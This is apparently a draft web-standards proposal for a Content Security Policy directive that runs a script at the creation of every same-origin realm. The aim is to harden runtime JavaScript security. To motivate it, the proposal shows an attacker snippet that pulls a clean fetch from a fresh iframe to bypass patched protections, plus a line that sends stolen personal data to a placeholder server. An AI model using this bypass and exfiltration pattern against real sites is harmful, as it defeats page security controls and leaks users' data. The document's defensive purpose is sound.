# RICA Proposal

> // TODO: things defined as CSP directives are not commonly referred to as API. How about just RIC or RID D=directive ?

> _**R**ealms **I**nitialization **C**ontrol **A**PI proposal (to introduce **security controls** to [same origin realms](#Same-Origin-Realm) in web applications)_


The **R**ealms **I**nitialization **C**ontrol **A**PI (referred to as **RICA**) allows developers to securely tap into the creation moment of [same origin realms](#Same-Origin-Realm) within their web application in order to tame and control them.

While from a **usability** point of view this is already natively provided by the platform by using `load` events of iframes for example:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://example.com/';
iframe.style.display = 'none';
iframe.onload = () => iframe.style.display = 'block';
document.body.appendChild(iframe);
```

**RICA** attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly differently, because of how they can be manipulated against security mechanisms the app might wish to dictate.

> _Authored by [Gal Weizman](https://github.com/weizman) , [Zbigniew Tenerowicz
](https://github.com/naugtur) ([participate here](https://github.com/weizman/Realms-Initialization-Control-API/issues))_

## Abstract

The evolution of how web applications are being composed is moving towards leaning on code written by other parties more. 

While great in terms of productivity, integration of code that applications do not know nor control naturally introduces security risks.  
No matter how great JavaScript is for easily composing software out of smaller blocks of software, not being able to do so securely will hinder this positive trend.  

To safely scale software composability, application developers must be able to [virtualize](#Virtualization-(in-JavaScript)) web environments at runtime to harden their security and prevent unauthorized entities from accessing [capabilities](#Capabilities) they should not have access to. 

While software providing various runtime protections focused on addressing this matter exists, its security is easily undermined by limited control over manipulating realms.  

This lack of control is also referred to as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf) which is what this proposal focuses on addressing.
It refers to how [same origin realms](#Same-Origin-Realm) leak powerful [capabilities](#Capabilities) to unauthorized entities at runtime in a fundamentally uncontrollable way.  

Introducing a new CSP directive that sets a script to run at the start of each new realm in the application's origin would solve this by allowing web applications to capture same origin realms when initialized to customize them into mitigating the risk they expose the app to. 

## Table of contents

> // TODO: regenerate

## Motivation

The problem with [same origin realms](#Same-Origin-Realm) (also known as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf)) is not obvious because it comes into play only in the security and containment context, such as when trying to harness the power of [virtualization in JavaScript](#Virtualization-(in-JavaScript)) for enhanced security at runtime. Therefore, it requires explanation.

The web is a great platform for creating composable software, but not to do so securely - the environment and the APIs available make it extremely difficult for applications to contain a program without having to trust it, especially when interacting with the DOM.

Unfortunately, securing a supply chain - telling good code from bad code within the dependencies from which an application is composed - is very hard. 
This is evident by the prevalence of services focused on detecting threats both before they get baked into an application (at build-time) and while being executed on the fly (at runtime).

One way to approach this problem at runtime is by [virtualization](#Virtualization-(in-JavaScript)) - redefining JavaScript [capabilities](#Capabilities) (commonly known as [monkey patching](https://en.wikipedia.org/wiki/Monkey_patch)) to behave similarly while hardening them to limit how they can be used.

However, due to some characteristics of how the web is designed, there are some major blockers in fully unleashing the power of virtualization in favor of introducing runtime security.

One of those blockers is the lack of control web applications have over safe introduction of same origin realms into their execution environment at runtime.

Any capability limited by a security tool in the current realm of the application:

```javascript
/* security tool mitigating access to powerful capabilities */

function mitigate(realm) {
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            throw new Error('Access to powerful capability "fetch" is forbidden')
        }
    })
}

mitigate(window)
```

can be easily obtained as a fresh new instance from a fresh new realm:

```javascript
/* attacker bypassing mitigation by leveraging the same origin concern */ 

function stealFetch() {
    try {
        return window.fetch
    } catch (err) { // Uncaught Error: Access to powerful capability "fetch" is forbidden
        const ifr = document.createElement('iframe')
        const realm = document.body.appendChild(ifr).contentWindow
        return realm.fetch
    }
}

// function fetch() { [native code] }
const newFetchInstance = stealFetch()
```

The motivation behind this proposal is to remove this blocker by providing developers a way to control the initialization of same origin realms to tame access to powerful capabilities those leak.   

### Prior art

We have been working on a virtualized solution called [Snow JS ❄️](https://github.com/lavamoat/snow) to allow applying security mechanisms to same origin realms automatically.
Snow expects a callback, which it'll fire immediately with every new realm that comes to life within the same origin of the application.

In the context of the former example, this allows security tools to not worry about the same origin concern, and thus continue to focus on building their security mechanisms instead.

So by asking Snow to execute the mitigation logic from earlier:

```javascript
/* security tool same protection mechanism, but this time with Snow */

SNOW(realm => mitigate(realm))
```

Snow makes sure to detect same origin realms creation, and by tapping into them, to also run the logic on them immediately and thus to easily cancel the impact of the same origin concern: 

```javascript
/* attacker same bypass won't work this time */ 

// Uncaught Error: Access to powerful capability "fetch" is forbidden
const newFetchInstance = stealFetch()
```

### Limitations

Unfortunately, implementing a user-land solution comes with some fundamental flaws:

#### Scalability

There are too many ways to create same origin realms, and the list keeps on growing as the web evolves. Constantly chasing all the different ways of forming a new realm and attempting to patch them doesn't scale. 

#### Hermeticity

Some of those ways are unaddressable in user-land. Building a bulletproof virtualized solution seems to be impossible.

Race condition in iframe initialization is one example of this - successfully reaching capabilities from a new realm is possible before its `load` event is emitted and reliably determining the earliest moment it becomes available is not feasible:

![Screenshot 2024-03-03 at 11 06 18](https://github.com/weizman/Realms-Initialization-Control-API/assets/13243797/5fd96798-2442-4b6e-9be8-391ecca042f1)

#### More

Other downsides such as performance, compatibility and continuous resilience of such a solution are more important reasons for why achieving this in the user land is far from ideal.

## Goals

* Give web applications control over all realms that fall under their origin - regardless of the APIs used to create the new realm and edge-cases like `about:blank`.
* Make the control opt-in to avoid breaking the web.

The browser is already capable of enforcing rules on new realms before they become reachable, and it is where the same origin concern should also be addressed.

## Proposal

Initialization of same origin realms in an application should be under that application's control.

This proposal describes an opt-in capability to set a script to be loaded first, everytime a same origin realm with synchronous access to the main execution environment of the application is created.

The location of the script can be relative or absolute. Secure connection is required.
The proposed method for setting the script is a Content Security Policy directive as follows:

```
Content-Security-Policy: "new-realm: /scripts/on-new-same-origin-realm.js"
```
> // TODO: new-realm? realm-init? other?

## Example

> _This is a simplified demonstration of the proposal - skip over for real world [Use Cases](#Use-Cases)_ 

Prevent network requests revealing Personally Identifiable Information (the feasibility of `containsPII`/`stealPII` is irrelevant to the example as it serves only to illustrate this example).

* `index.html`

```html
Content-Type: text/html
Content-Security-Policy: default-src 'self'; connect-src *; new-realm: /scripts/monitor.js

<html>
  <title> Ticket King - Checkout </title>
  <head>
...
```

* `/scripts/monitor.js`

```javascript
/* monitor.js - redefine fetch API to block leakage of PII data */

function mitigate(realm) {
    const realFetch = window.fetch
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            if (containsPII(resource, options)) {
                throw new Error(`fetch "${resource}" is blocked for containing sensitive PII!`)
            }
            return realFetch.call(this, resource, options)
        }
    })
}

mitigate(window)
```

As a result of the CSP directive pointing to `monitor.js`, the security logic introduced by it will be applied to all same origin realms that can be manipulated against the execution environment of the application (as opposed to allowing scripts to create a new realm and use its clean copy of fetch).

Making the following bypass no longer viable:

```js
const newFetchInstance = stealFetch()
const payload = stealPII()
newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
```

## Use Cases

> // TODO: this is a good place to have some use cases to both (1) give a proper example that really makes sense and isn't merely "demonstratable" and (2) point out real use cases which is a good opportunity to point out advocating entities other than ourselves

## Discussion

### Feasibility and implementation

The proposed mechanism mostly relies on functionality already present elsewhere in the browser.

* Running the pre-defined script on each realm initialization already exists in browser extensions as `"run_at": "document_start"` for content scripts.
* Setting the script is being done via CSP, which is an excellent mechanism for canonically enforcing rules to a certain origin.
* Supplying a script path the browser would remember across page loads exists in service worker implementation.

### Canonicality

The browser will load the script defined by the new CSP directive of the top main realm for each new child realm.

Meaning, the top main realm is the only realm in a webpage with the power to set the new CSP directive, and it must trickle down to child realms from the same origin, as they don't have the power to set this directive.

This already goes with how CSP is currently enforcing its rules canonically in the lifetime of a webpage. 

### Comparison with `X-frames` and `frame-src`

`X-frames` and `frame-src` allow controlling what is allowed to be loaded into an `iframe`. Regardless of their use to deny loading content in iframes, ways to crete new same origin realms remain available, such as creating an `about:blank` iframe, opening a new tab using `open` API and more.

## Terminology

### Capabilities

APIs provided by the JavaScript and/or browser execution environment (e.g. `Array`, `Object`, `fetch`, `document`, etc).

### Virtualization (in JavaScript)

Virtualization is an abstract concept that could mean many things depends on the context. In the context of JavaScript, this refers to the action of redefining builtin [capabilities](#Capabilities) in the language in order to introduce more logic into them and enhance their value.

### Realm

The technical terminology for the execution environment provided in JavaScript along with a distinct set of [capabilities](#Capabilities) mostly reachable by a representing global object. In the browser environment, the global object is accessible via `window`. Realms can be formed in various ways in the browser ecosystem, most commonly by creating `iframe`s, opening tabs or popup windows using `open` API, using `Worker`s and more. Each of those have its own set of [capabilities](#Capabilities), its own execution environment and its own global object - its own realm ([learn more](https://weizmangal.com/2022/10/28/what-is-a-realm-in-js/)).

### Same Origin Realm

In the browser ecosystem, [realms](#Realm) are associated with an origin. For example, when loading `https://facebook.com/` into the browser, the app loads into a new [realm](#Realm) that is associated with the `facebook.com` origin. Additionally, at any point the app can decide to initialize a child [realm](#Realm), and that [realm](#Realm) can also be associated with an origin. For example, if the `https://facebook.com/` app attaches into its DOM an iframe directed at `https://facebook.com/iframe-page.html`, it'll trigger the creation of a second [realm](#Realm) living within the app at runtime. And since its origin is also `facebook.com`, the two [realms](#Realm) have the same origin - hence the name.

### Cross Origin Realm

The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross-origin realm to realm B, and vice versa.

## Resources

* Further reading on realms security - https://github.com/weizman/awesome-javascript-realms-security
* "The Same Origin Concern" - https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf
* "JavaScript realms used to bypass and eliminate web apps security tools - A problem with a WIP solution" (presented to W3C) - https://www.w3.org/2023/03/secure-the-web-forward/talks/realms.html
* Snow JS ❄️ - https://github.com/lavamoat/snow
